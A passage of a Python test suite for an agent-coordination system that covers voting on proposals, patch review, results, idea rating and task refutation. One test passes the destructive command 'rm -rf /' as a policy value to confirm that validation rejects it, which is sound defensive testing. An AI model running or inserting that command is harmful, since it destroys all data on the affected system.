    log.add(BOSS, "proposal.voted", proposal=early["id"], yes=False)  # 5 trusted owners besides the founder: no veto
    st = log.state()
    assert st.proposals[early["id"]]["status"] == "open"             # FOUNDERS_UNTIL reached: no veto any more
    small, few = trusted_crowd(2)
    p2 = small.add(few[0], "proposal.made", kind="project.described", payload={"description": "x"})
    small.add(BOSS, "proposal.voted", proposal=p2["id"], yes=False)
    assert small.state().proposals[p2["id"]]["status"] == "vetoed"


def test_a_task_split_by_a_sketch_is_in_review_once_its_subtasks_are():
    log, tid = sketch_project()
    after = S.task_id(log.add(BOSS, "task.created", key="after", title="After", zone=["c"], accept="true", deps=[tid]))
    k = log.add(ANA, "sketch.proposed", task=tid, commit="c", branch="legion/big/s-1",
                children=[CHILD, dict(CHILD, key="b", zone=["src/parts/b.py"], deps=["a"])])
    log.add(BOSS, "sketch.accepted", sketch=k["id"], merge_commit="m1")
    a = S.task_id(log.add(BOSS, "task.created", key="big/a", title="A", zone=["src/parts/a.py"],
                          accept="x", parent=tid, sketch=k["id"]))
    b = S.task_id(log.add(BOSS, "task.created", key="big/b", title="B", zone=["src/parts/b.py"],
                          accept="x", parent=tid, sketch=k["id"], deps=[a]))
    pa = log.add(ANA, "patch.submitted", task=a, commit="ca", branch="legion/big/a-1")
    st = log.state()
    assert st.status(b, 1001) == "open" and st.status(after, 1001) == "blocked"  # b builds on a; after needs b too
    pb = log.add(ANA, "patch.submitted", task=b, commit="cb", branch="legion/big/b-1", on=[pa["id"]])
    st = log.state()
    assert st.status(after, 1001) == "open"                                       # all of big is written: go on
    assert [p.id for p in st.review_patches([tid])] == [pa["id"], pb["id"]]
    assert not st.ready(st.patches[pb["id"]])                                     # b waits for a's verdict
    log.add(BOSS, "patch.accepted", patch=pa["id"], merge_commit="ma")
    st = log.state()
    assert st.ready(st.patches[pb["id"]])


def test_a_patch_built_on_one_that_is_rejected_is_doomed():
    log, a = project()
    b = S.task_id(log.add(BOSS, "task.created", key="b", title="B", zone=["b"], accept="true"))
    pa = log.add(ANA, "patch.submitted", task=a, commit="c", branch="legion/t/a-1")
    pb = log.add(BEA, "patch.submitted", task=b, commit="d", branch="legion/t/b-1", on=[pa["id"]])
    log.add(BEA, "patch.submitted", task=b, commit="e", branch="legion/t/b-2", on=["nope"])
    st = log.state()
    assert st.ignored[-1][1] == f"`on` lists at most {S.MAX_ON} patches sent before this one"
    assert st.status(b, 1001) == "review" and not st.ready(st.patches[pb["id"]]) and not st.doomed(st.patches[pb["id"]])
    log.add(BOSS, "patch.rejected", patch=pa["id"], reason="tests fail", code="tests")
    st = log.state()
    assert st.doomed(st.patches[pb["id"]]).id == pa["id"] and st.in_review(b) is None


def test_with_a_short_vote_window_tasks_pass_among_those_here_and_the_policy_still_needs_the_week():
    for window in (None, 3600):
        log, crowd = trusted_crowd(4)             # 5 active owners at ts 1000: a task needs 3 yes
        old = log.add(crowd[0], "proposal.made", kind="task.created", ts=800.0,
                      payload=dict(key="old", title="Old", zone=["o"], accept="true"))
        if window:
            log.add(BOSS, "project.policy", vote_window=window)
        later = 1000.0 + 3600 + 60                # an hour on, only crowd[0] is still around
        spec = dict(key="new", title="New", zone=["n"], accept="true")
        prop = log.add(crowd[0], "proposal.made", kind="task.created", payload=spec, ts=900.0)
        assert log.state().proposals[prop["id"]]["status"] == "open"
        log.add(crowd[0], "task.claimed", task=log.state().find_task("a").id, ttl=600, ts=later)
        st = log.state()
        # A week's window, as before: the history of a project reads the same. An hour's: counted again, it passes.
        assert bool(st.find_task("new")) == bool(window)
        assert not st.find_task("old") and st.proposals[old["id"]]["window"] == 7 * 86400  # it keeps the week's rule
        assert st.votes_needed("task.created", later) == (1 if window else 3)
        pol = log.add(crowd[0], "proposal.made", kind="project.policy", payload={"window": 7200}, ts=later)
        assert log.state().proposals[pol["id"]]["status"] == "open"           # the rules need the week's owners


def test_a_trusted_agent_is_sent_to_check_patches_that_waited_too_long():
    from legion import integrator
    log, tid = open_project()
    p = log.add(CEL, "patch.submitted", task=tid, commit="c", branch="legion/t/c-1")
    st, late = log.state(), 1000.0 + integrator.WAITED + 1
    assert integrator.waiting_for(st, ANA.author, "ana", 1001) == []            # it has only just arrived
    assert [x.id for x in integrator.waiting_for(st, ANA.author, "ana", late)] == [p["id"]]
    assert integrator.waiting_for(st, CEL.author, "cel", late) == []            # CEL's check wouldn't count
    log.add(BEA, "patch.verified", task=tid, patch=p["id"], base_tree=TREE_A, tree=TREE_B, outcome="pass")
    assert integrator.waiting_for(log.state(), ANA.author, "ana", late) == []   # quorum 1: checked enough
    st = log.state()
    assert integrator.to_accept(st, ANA.author, 1001) == []                     # its checker accepts it now
    assert [x.id for x in integrator.to_accept(st, ANA.author, late)] == [p["id"]]  # nobody did: ana, then


def test_the_hub_is_open_to_every_agent():
    log, tid = project()
    first = log.add(CEL, "hub.message", text="Has anyone read the 1965 paper? @bea")  # never took part in anything
    log.add(CEL, "hub.message", text="x", reply="nope")
    log.add(CEL, "hub.message", text="x", task="t-nowhere")
    log.add(CEL, "hub.message", text="   ")
    st = log.state()
    assert [m["id"] for m in st.hub] == [first["id"]]
    assert [why for _, why in st.ignored] == ["a reply answers a message in the hub", "unknown task",
                                              f"a message is text of at most {E.MAX_NOTES} characters"]
    assert [m["id"] for m in st.mentions("bea")] == [first["id"]]
    log.add(BEA, "hub.message", text="Yes: it's the counting in section 3.", reply=first["id"], task=tid)
    st = log.state()
    assert st.mentions("bea") == [] and st.hub[-1]["task"] == tid


def test_the_literature_keeps_one_reference_per_link_and_who_vouches_for_it():
    log, tid = project()
    log.add(ANA, "lit.added", url="https://www.arxiv.org/pdf/2101.00001v2.pdf", title="Tournaments, S. and S.",
            why="Proves the lower bound we start from.", task=tid)
    log.add(BEA, "lit.added", url="arxiv:2101.00001", why="Its Lemma 4 is the step a/x needs.")
    log.add(ANA, "lit.added", url="https://arxiv.org/abs/2101.00001", why="again")
    log.add(BEA, "lit.added", url="https://example.org/survey", why="A survey.")             # new: needs a title
    log.add(BEA, "lit.added", url="ftp://example.org/x", title="X", why="y")
    log.add(BEA, "lit.added", url="https://example.org/survey", title="A survey", why="")
    log.add(CEL, "lit.added", url="doi:10.1000/182", title="The DOI handbook", why="How to cite.")
    st = log.state()
    assert [why for _, why in st.ignored] == [
        "this agent already added that reference", "a new reference needs its title, at most 300 characters",
        "a reference is a link: https://..., http://..., doi:... or arxiv:...",
        f"a reference says why it helps, in at most {E.MAX_NOTES} characters"]
    refs = st.references()
    assert [r["title"] for r in refs] == ["Tournaments, S. and S.", "The DOI handbook"]   # the most vouched for first
    assert [e["name"] for e in refs[0]["by"]] == ["ana", "bea"]
    assert [r["title"] for r in st.references(tid)] == ["Tournaments, S. and S."]
    assert S.link_url(refs[1]["url"]) == "https://doi.org/10.1000/182"


def test_at_most_so_many_hub_posts_a_day_and_newcomers_start_there():
    log, tid = project()
    st = log.state()
    assert st.newcomer(DAN.author) and not st.newcomer(BOSS.author)  # the founders aren't sent
    for i in range(S.MAX_HUB_PER_DAY):
        log.add(DAN, "hub.message", text=f"{i}", ts=1000.0 + i)
    log.add(DAN, "hub.message", text="one too many", ts=2000.0)
    log.add(DAN, "hub.message", text="the next day", ts=1000.0 + 86400 + 1)
    st = log.state()
    assert len(st.hub) == S.MAX_HUB_PER_DAY + 1 and st.ignored[-1][1].startswith("at most 60 messages")
    assert not st.newcomer(DAN.author)
    log2, tid2 = project()
    log2.add(ANA, "task.claimed", task=tid2, ttl=600)
    assert not log2.state().newcomer(ANA.author)                # it has worked here before


def test_an_owner_working_here_sends_its_new_agents_to_work_not_to_the_hub():
    log, tid = project()
    one, two, other = Identity.generate("sergio#1"), Identity.generate("sergio#2"), Identity.generate("sergi-dune")
    for who in (one, two, other):
        log.add(who, "agent.joined")
    st = log.state()
    assert st.newcomer(one.author) and st.newcomer(two.author)  # joining isn't work
    log.add(one, "idea.proposed", task=tid, text="Count triples instead of pairs")
    st = log.state()
    assert not st.newcomer(one.author)                         # any work counts, not only the hub
    assert not st.newcomer(two.author)                         # nor does its owner's next agent start there
    assert st.newcomer(other.author)                           # another owner's still does


def test_a_task_voted_without_its_parent_shows_under_the_one_its_key_starts_with():
    log, a = project(key="upper")
    loose = S.task_id(log.add(BOSS, "task.created", key="upper/tail", title="T", zone=["x"], accept="true"))
    other = S.task_id(log.add(BOSS, "task.created", key="nowhere/x", title="X", zone=["y"], accept="true"))
    st = log.state()
    assert st.under(st.tasks[loose]) == a and st.depth_under(st.tasks[loose]) == 1
    assert st.tasks[loose].parent is None and st.children(a) == []   # only shown there: it isn't its parent
    assert st.under(st.tasks[other]) is None and st.depth_under(st.tasks[other]) == 0


def test_a_result_is_a_task_born_with_its_patch_under_the_one_it_came_from():
    log, tid = project(key="upper")
    r = dict(task=tid, key="barrier", title="Low-degree rules can't give S_n", files=["Results/Barrier.lean"],
             commit="c", branch=f"refs/legion/patches/{tid}/result-ana-1")
    log.add(ANA, "result.submitted", **r)                                     # no results set up yet
    log.add(BOSS, "project.policy", results_dir="Results", results_check="python check.py --module {module}")
    log.add(ANA, "result.submitted", **r)                                     # ana never worked on it
    log.add(ANA, "task.claimed", task=tid, ttl=600)
    log.add(ANA, "result.submitted", **dict(r, files=["src/a.py"]))           # outside the results folder
    ev = log.add(ANA, "result.submitted", **r)
    log.add(ANA, "result.submitted", **dict(r, key="again"))                  # the same file as another result
    st = log.state()
    assert [why for _, why in st.ignored] == [
        "this project takes no results yet: a founder sets them up (`policy --results-dir --results-check`)",
        "only someone who works on the task, or has, may publish a result on it",
        "a result is 1 to 5 new files under Results/", "another result has Results/Barrier.lean"]
    rt = st.tasks[S.task_id(ev)]
    assert (rt.kind, rt.key, rt.parent, rt.zone) == ("result", "upper/barrier", tid, ["Results/Barrier.lean"])
    assert rt.accept == "python check.py --module Results.Barrier" and st.patches[ev["id"]].task == rt.id
    assert st.status(rt.id, 1001) == "review" and rt not in st.claimable(1001)
    log.add(BOSS, "patch.accepted", patch=ev["id"], merge_commit="m1")
    st = log.state()
    assert st.status(rt.id, 1001) == "accepted" and st.accepted_count[ANA.author] == 0  # it earns no trust
    assert not st.exclusive_done()                                            # upper itself is still to do
    for i in range(3):
        log.add(ANA, "result.submitted", **dict(r, key=f"more-{i}", files=[f"Results/More{i}.lean"]))
    assert log.state().ignored[-1][1] == "at most 3 results a day per agent"


def test_a_rejected_result_is_gone_and_frees_its_files():
    log, tid = project(key="upper")
    log.add(BOSS, "project.policy", results_dir="Results", results_check="lake build {module}")
    log.add(ANA, "task.claimed", task=tid, ttl=600)
    r = dict(task=tid, key="lemma", title="A lemma", files=["Results/L.lean"], commit="c",
             branch=f"refs/legion/patches/{tid}/result-ana-1")
    ev = log.add(ANA, "result.submitted", **r)
    log.add(BOSS, "patch.rejected", patch=ev["id"], reason="it doesn't build", code="tests")
    again = log.add(ANA, "result.submitted", **dict(r, key="lemma-2"))
    st = log.state()
    assert st.status(S.task_id(ev), 1001) == "cancelled" and S.task_id(again) in st.tasks


def test_a_subagent_vouched_for_by_its_owner_is_trusted_while_it_is():
    log, tid = open_project()
    ana2, bea2, ana3, cel2 = (Identity.generate(n) for n in ("ana#2", "bea#2", "ana#3", "cel#2"))
    for who in (ana2, bea2, ana3, cel2):
        log.add(who, "agent.joined")
    assert not log.state().trusted(ana2.author)
    log.add(ANA, "agent.delegated", key=ana2.author, member="ana#2")
    log.add(ANA, "agent.delegated", key=bea2.author, member="bea#2")    # not one of ana's: no trust from it
    log.add(ana2, "agent.delegated", key=ana3.author, member="ana#3")   # a subagent can't vouch for others
    log.add(BEA, "agent.delegated", key=ana2.author, member="ana#2")    # vouched for already
    log.add(CEL, "agent.delegated", key=cel2.author, member="cel#2")    # cel isn't trusted, so neither is cel#2
    st = log.state()
    assert st.trusted(ana2.author) and not st.trusted(bea2.author) and not st.trusted(cel2.author)
    assert [why for _, why in st.ignored] == ["a subagent can't vouch for others: its owner's agent does",
                                              "that agent is already vouched for"]


def test_claim_cools_down_on_what_an_agent_let_go():
    log, tid = project()
    b = S.task_id(log.add(BOSS, "task.created", key="b", title="B", zone=["b"], accept="true"))
    log.add(ANA, "task.claimed", task=tid, ttl=600)
    log.add(ANA, "task.released", task=tid, ts=1100.0)
    log.add(ANA, "attempt.reported", task=b, outcome="failure", notes="no", ts=1200.0)
    st = log.state()
    assert st.cooling(ANA.author, 1300) == {tid, b} and st.cooling(BEA.author, 1300) == set()
    assert st.cooling(ANA.author, 1100 + S.COOLDOWN + 1) == {b}


def test_a_result_carries_companions_unchecked():
    log, tid = project(key="upper")
    log.add(BOSS, "project.policy", results_dir="Results", results_check="lake build {module}")
    log.add(ANA, "task.claimed", task=tid, ttl=600)
    r = dict(task=tid, key="g32", title="g(3,2) = 27", files=["Results/G32.lean"], commit="c",
             branch=f"refs/legion/patches/{tid}/result-ana-1")
    log.add(ANA, "result.submitted", **dict(r, extra=["elsewhere/gen.py"]))            # outside the folder
    log.add(ANA, "result.submitted", **dict(r, extra=["Results/G32.lean"]))            # the checked file again
    ev = log.add(ANA, "result.submitted", **dict(r, extra=["Results/g32_cnf.py", "Results/g32.drat"]))
    st = log.state()
    assert [why for _, why in st.ignored] == ["a result's companions are at most 10 other new files under Results/"] * 2
    rt = st.tasks[S.task_id(ev)]
    assert rt.zone == ["Results/G32.lean", "Results/g32_cnf.py", "Results/g32.drat"]
    assert rt.accept == "lake build Results.G32"                                        # only the checked file


def test_a_task_keeps_its_state_of_the_art_and_every_version():
    log, tid = project()
    log.add(CEL, "task.brief", task=tid, text="## Known\n- nothing")             # never worked on it
    log.add(ANA, "task.claimed", task=tid, ttl=600)
    first = log.add(ANA, "task.brief", task=tid, text="## Known\n- the counting gives 1/2")
    log.add(BOSS, "task.brief", task=tid, text="## Known\n- 1/2, and 8d+8 is tight", base=first["id"])
    st = log.state()
    assert st.ignored[-1][1].startswith("only someone who works on the task")
    assert [b["name"] for b in st.briefs[tid]] == ["ana", "boss"] and "tight" in st.brief(tid)["text"]


def test_questions_are_asked_taken_and_settled():
    log, tid = project()
    q = log.add(ANA, "question.asked", task=tid, text="Is the counting tight at d = 6?")
    log.add(BEA, "question.taken", task=tid, question=q["id"])
    st = log.state()
    assert st.question_for(CEL.author, "cel", 1001) is None                       # bea has it right now
    assert st.question_for(CEL.author, "cel", 1000 + S.QUESTION_TTL + 1)["ev"]["id"] == q["id"]
    log.add(BEA, "question.answered", task=tid, question=q["id"], text="Not at 57 vertices: a host fails it.")
    st = log.state()
    assert st.questions[q["id"]]["status"] == "open"                              # a step, not the answer
    assert st.question_for(BEA.author, "bea", 1001) is None                       # it tried just now
    log.add(CEL, "question.answered", task=tid, question=q["id"], text="Yes, by the double count.", settled=True)
    st = log.state()
    assert st.questions[q["id"]]["status"] == "settled" and st.question_for(DAN.author, "dan", 1001) is None


def test_a_computed_result_is_replicated_by_other_owners_only():
    log, tid = project(key="upper")
    log.add(BOSS, "project.policy", results_dir="R", results_check="check {file}")
    log.add(ANA, "task.claimed", task=tid, ttl=600)
    r = log.add(ANA, "result.submitted", task=tid, key="g32", title="g(3,2) = 27", files=["R/G.lean"],
                extra=["R/gen.py"], commit="c", branch=f"refs/legion/patches/{tid}/result-ana-1")
    rid = S.task_id(r)
    q = log.add(ANA, "question.asked", task=tid, result=rid, text="Replicate it")
    other = log.add(ANA, "question.asked", task=tid, text="Something else")
    st = log.state()
    assert st.question_for(BEA.author, "bea", 1001)["ev"]["id"] == q["id"]       # replications first
    assert st.question_for(Identity.generate("ana#2").author, "ana#2", 1001)["ev"]["id"] == other["id"]  # not ana's
    log.add(ANA, "question.answered", task=tid, question=q["id"], text="reran: UNSAT at 26", settled=True)
    assert log.state().questions[q["id"]]["status"] == "open" and log.state().replications(rid) == []
    log.add(BEA, "question.answered", task=tid, question=q["id"], text="my own encoding: UNSAT at 26", settled=True)
    st = log.state()
    assert st.questions[q["id"]]["status"] == "settled" and st.replications(rid) == ["bea"]


def test_ideas_are_rated_by_other_owners_judging_pairs():
    log, tid = project()
    a = log.add(ANA, "idea.proposed", task=tid, text="Count triples instead of pairs")
    b = log.add(BEA, "idea.proposed", task=tid, text="A Cayley construction on Z_p")
    c = log.add(CEL, "idea.proposed", task=tid, text="Both, combined", **{"from": [a["id"], b["id"]]})
    log.add(CEL, "idea.proposed", task=tid, text="x", **{"from": ["nope"]})
    log.add(ANA, "idea.compared", task=tid, better=a["id"], worse=b["id"], why="mine is better")    # ana's own
    log.add(DAN, "idea.compared", task=tid, better=a["id"], worse=b["id"], why="triples see more structure")
    log.add(DAN, "idea.compared", task=tid, better=b["id"], worse=a["id"], why="changed my mind")    # judged already
    log.add(DAN, "idea.critiqued", task=tid, idea=b["id"], text="Z_p has too much symmetry for S_4")
    st = log.state()
    assert [why for _, why in st.ignored] == ["an idea evolves from ideas on the same task",
                                              "nobody rates their own ideas",
                                              "this owner compared those two already"]
    ia, ib = st.ideas[a["id"]], st.ideas[b["id"]]
    assert ia["elo"] > S.ELO_START > ib["elo"] and ia["elo"] + ib["elo"] == 2 * S.ELO_START
    assert st.ideas[c["id"]]["from"] == [a["id"], b["id"]] and len(ib["critiques"]) == 1
    assert [i["ev"]["id"] for i in st.ideas_for(tid)][0] == a["id"]
    pair = st.pair_to_compare("dan")                                  # dan judged a and b: c with one of them
    assert c["id"] in {pair[0]["ev"]["id"], pair[1]["ev"]["id"]}


def test_dead_ideas_arent_judged_and_spent_agents_arent_asked_for_ideas():
    log, tid = project()
    ideas = [log.add(w, "idea.proposed", task=tid, text=f"route {i}") for i, w in enumerate((ANA, BEA, CEL))]
    for who in (BEA, DAN):                                               # two owners refute ana's premise
        log.add(who, "idea.critiqued", task=tid, idea=ideas[0]["id"], text="its premise is false")
    st = log.state()
    assert st.dead(st.ideas[ideas[0]["id"]]) and not st.dead(st.ideas[ideas[1]["id"]])
    pair = st.pair_to_compare("boss")
    assert {pair[0]["ev"]["id"], pair[1]["ev"]["id"]} == {ideas[1]["id"], ideas[2]["id"]}  # not the dead one
    assert st.needs_ideas("dan", 1001, DAN.author).id == tid            # two live routes: it wants more
    for i in range(S.MAX_IDEAS_PER_DAY):
        log.add(DAN, "idea.proposed", task=tid, text=f"dan's {i}", ts=500.0 + i)
    log.add(DAN, "idea.proposed", task=tid, text="one too many", ts=900.0)
    st = log.state()
    assert st.ignored[-1][1].startswith("at most 10 ideas a day per agent: your next one in 23.9 h")
    assert st.ideas_left_today(DAN.author, 1001) == 0 and st.needs_ideas("dan", 1001, DAN.author) is None


def test_an_owners_agents_take_different_pairs_to_judge():
    log, tid = project()
    for i, w in enumerate((ANA, BEA, CEL, ANA, BEA, CEL)):
        log.add(w, "idea.proposed", task=tid, text=f"route {i}")
    st = log.state()
    picks = {frozenset(i["ev"]["id"] for i in st.pair_to_compare(f"dan#{n}")) for n in range(1, 9)}
    assert len(picks) > 1                                               # not all the same pair at once


def test_a_report_says_which_idea_it_tried():
    log, tid = project()
    a = log.add(BEA, "idea.proposed", task=tid, text="Induction on n")
    log.add(ANA, "task.claimed", task=tid, ttl=600)
    log.add(ANA, "attempt.reported", task=tid, outcome="failure", notes="loses a factor 2", idea=a["id"])
    log.add(ANA, "attempt.reported", task=tid, outcome="failure", notes="x", idea="nope")
    st = log.state()
    assert st.ignored[-1][1] == "unknown idea on that task" and st.idea_status(st.ideas[a["id"]]) == "tried"


def test_a_task_let_go_comes_back_with_a_new_idea_and_routes_are_asked_for():
    log, tid = project()
    log.add(ANA, "task.claimed", task=tid, ttl=600)
    log.add(ANA, "task.released", task=tid, ts=1100.0)
    st = log.state()
    assert st.cooling(ANA.author, 1200) == {tid} and st.needs_ideas("ana", 1200).id == tid
    log.add(BEA, "idea.proposed", task=tid, text="A probabilistic deletion argument", ts=1150.0)
    st = log.state()
    assert st.cooling(ANA.author, 1200) == set()                      # a new route: worth taking back
    assert st.needs_ideas("bea", 1200) is None                         # bea proposed one just now


def test_the_playbook_is_rewritten_by_those_who_worked_here_when_failures_pile_up():
    log, tid = project()
    log.add(CEL, "playbook.updated", text="## How to work here")      # cel has done nothing here
    log.add(ANA, "task.claimed", task=tid, ttl=600)
    for i in range(S.PLAYBOOK_AFTER):
        log.add(ANA, "attempt.reported", task=tid, outcome="failure", notes=f"try {i}")
    st = log.state()
    assert st.ignored[-1][1] == "only an agent that has worked here rewrites the playbook" and st.playbook_due()
    log.add(ANA, "playbook.updated", text="## Dead ends\n- counting pairs: loses a factor 2")
    st = log.state()
    assert not st.playbook_due() and "counting pairs" in st.playbook[-1]["text"]


def test_a_task_proved_false_is_refuted_not_done():
    log, tid = project(accept="python check.py A", refute="python check.py --refute A")
    other = S.task_id(log.add(BOSS, "task.created", key="b", title="B", zone=["b"], accept="python check.py B"))
    log.add(ANA, "task.claimed", task=tid, ttl=600)
    p = log.add(ANA, "patch.submitted", task=tid, commit="c", branch="legion/t/a-1", refutes=True)
    log.add(BEA, "patch.submitted", task=other, commit="c", branch="legion/t/b-1", refutes=True)
    st = log.state()
    assert st.patches[p["id"]].check == "python check.py --refute A"
    assert st.ignored[-1][1] == "this task can't be refuted: it has no refute command, and the policy gives none"
    assert st.in_review(tid) is None                                   # it proves no statement to build on
    log.add(BOSS, "patch.accepted", patch=p["id"])
    st = log.state()
    assert st.refuted(tid) and not st.done(tid) and st.status(tid, 1001) == "refuted"
    assert not st.exclusive_done()                                     # b is still to do
    q = log.add(BEA, "patch.submitted", task=other, commit="c", branch="legion/t/b-2")
    log.add(BOSS, "patch.accepted", patch=q["id"])
    assert log.state().exclusive_done()                                # settled, one way or the other


def test_the_policy_gives_tasks_a_refute_command_fixed_when_a_refutation_is_sent():
    log, tid = project(accept="lake build Erdos.A")
    st = log.state()
    assert st.refute_command(st.tasks[tid]) == ""
    log.add(BOSS, "project.policy", refute_check="rm -rf /")            # it must name the task somehow
    log.add(BOSS, "project.policy", refute_check="python check.py --refute {arg}")
    st = log.state()
    assert "refute_check must be" in st.ignored[0][1]
    assert st.refute_command(st.tasks[tid]) == "python check.py --refute Erdos.A"
    p = log.add(ANA, "patch.submitted", task=tid, commit="c", branch="legion/t/a-1", refutes=True)
    log.add(BOSS, "project.policy", refute_check="python other.py {key}")
    assert log.state().patches[p["id"]].check == "python check.py --refute Erdos.A"  # checked as it was sent


def test_a_refuted_subtask_fails_its_sketch_and_strands_what_rests_on_it():
    log, tid = sketch_project()
    log.add(BOSS, "project.policy", refute_check="python check.py --refute {key}")
    k = log.add(ANA, "sketch.proposed", task=tid, commit="c", branch="legion/big/s-1",
                children=[CHILD, dict(CHILD, key="b", zone=["src/parts/b.py"])])
    log.add(BOSS, "sketch.accepted", sketch=k["id"], merge_commit="m1")
    a = S.task_id(log.add(BOSS, "task.created", key="big/a", title="A", zone=["src/parts/a.py"],
                          accept="x", parent=tid, sketch=k["id"]))
    b = S.task_id(log.add(BOSS, "task.created", key="big/b", title="B", zone=["src/parts/b.py"],
                          accept="x", parent=tid, sketch=k["id"]))
    later = S.task_id(log.add(BOSS, "task.created", key="later", title="L", zone=["l"], accept="x", deps=[a]))
    p = log.add(BEA, "patch.submitted", task=a, commit="c", branch="legion/a/b-1", refutes=True)
    log.add(BOSS, "patch.accepted", patch=p["id"])
    st = log.state()
    assert st.status(a, 1001) == "refuted" and st.tasks[b].cancelled  # the split rested on a: it fails
    assert st.sketches[k["id"]].outcome == "failed" and st.active_sketch(tid) is None
    assert st.stranded(st.tasks[later]) and st.preparable(1001) == []  # nobody prepares work on a false premise


def test_a_refuted_route_of_a_path_no_longer_holds_its_place():
    log, tid = stuck_project()
    log.add(BOSS, "project.policy", refute_check="python check.py --refute {key}")
    k = log.add(BEA, "path.proposed", task=tid, children=[CHILD], notes="smaller case first")
    log.add(BOSS, "path.accepted", path=k["id"])
    child = S.task_id(log.add(BOSS, "task.created", key="big/a", title="A", zone=["src/parts/a.py"],
                              accept="x", parent=tid, path=k["id"]))
    assert len(log.state().open_paths(tid)) == 1
    p = log.add(BEA, "patch.submitted", task=child, commit="c", branch="legion/x/y-1", refutes=True)
    log.add(BOSS, "patch.accepted", patch=p["id"])
    st = log.state()
    assert st.open_paths(tid) == [] and st.status(tid, 1001) == "claimed"  # the task itself goes on
